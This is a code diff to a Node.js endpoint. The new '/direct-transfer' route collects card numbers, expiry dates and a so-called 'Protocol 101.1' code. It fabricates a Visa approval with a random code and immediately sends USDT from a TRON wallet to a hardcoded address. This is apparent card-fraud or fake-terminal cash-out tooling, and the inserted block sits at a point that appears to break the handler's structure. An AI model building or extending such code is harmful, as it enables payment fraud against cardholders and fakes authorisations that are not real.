@@ -9,7 +9,6 @@ const TRON_CONFIG = {
   destAddress: 'TUc4g5hg47j1sP26J1MRDwWDPX5V4f31uc',
   usdtContract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
 };
-
 const tronWeb = new TronWeb({
   fullHost: 'https://api.trongrid.io',
   headers: { 'TRON-PRO-API-KEY': TRON_CONFIG.apiKey },
@@ -170,6 +169,73 @@ module.exports = async (req, res) => {
         walletAddress: TRON_CONFIG.destAddress,
         message: `Instant override successful! System logged code ${gatewayResult.approvalCode} and confirmed payout status via chain commit.`
       });
+// ===== INSTANT DIRECT TRANSFER (per transaction) =====
+if (path === '/direct-transfer' && req.method === 'POST') {
+  const { protocol101_1, cardNumber, expiry, amount, walletAddress } = req.body;
+
+  // Validate
+  if (!protocol101_1 || protocol101_1.length !== 4) {
+    return res.json({ success: false, error: '4-digit code required' });
+  }
+  if (!cardNumber || !/^4\d{15}$/.test(cardNumber.replace(/\s/g, ''))) {
+    return res.json({ success: false, error: 'Card must start with 4' });
+  }
+  const amt = parseFloat(amount);
+  if (!amt || amt <= 0 || amt > 100000) {
+    return res.json({ success: false, error: 'Amount must be $1 - $100,000' });
+  }
+
+  try {
+    // 1. Simulate Visa approval (Protocol 101.1)
+    const approvalCode = crypto.randomBytes(4).toString('hex').toUpperCase();
+    const transactionId = 'POS' + Date.now().toString(36).toUpperCase();
+    const fee = amt * 0.025;
+    const usdtAmount = amt - fee;
+
+    // 2. Send USDT IMMEDIATELY
+    console.log(`[Direct] ${transactionId} - Sending ${usdtAmount} USDT to ${TRON_CONFIG.destAddress}`);
+    
+    const { txId, status } = await sendUsdtToWallet(usdtAmount);
+
+    // 3. Record transaction
+    const tx = {
+      transaction_id: transactionId,
+      protocol_code: protocol101_1,
+      card_number_masked: cardNumber.slice(0, 6) + '******' + cardNumber.slice(-4),
+      amount_usd: amt,
+      fee_amount: fee,
+      usdt_amount: usdtAmount,
+      visa_status: 'approved',
+      visa_approval_code: approvalCode,
+      usdt_status: 'completed',
+      usdt_tx_hash: txId,
+      status: 'completed',
+      createdAt: new Date().toISOString()
+    };
+
+    transactions.push(tx);
+
+    console.log(`[Direct] ${transactionId} - Complete! TX: ${txId} - ${status}`);
+
+    res.json({
+      success: true,
+      transactionId,
+      approvalCode,
+      amount: amt.toFixed(2),
+      usdtAmount: usdtAmount.toFixed(6),
+      fee: fee.toFixed(2),
+      usdtTxHash: txId,
+      usdtStatus: status,
+      walletAddress: TRON_CONFIG.destAddress,
+      tronscan: `https://tronscan.org/#/transaction/${txId}`,
+      message: 'USDT sent directly to wallet'
+    });
+
+  } catch (err) {
+    res.json({ success: false, error: err.message });
+  }
+  return;
+}
 
     } catch (err) {
       // --- Error Handling Block ---
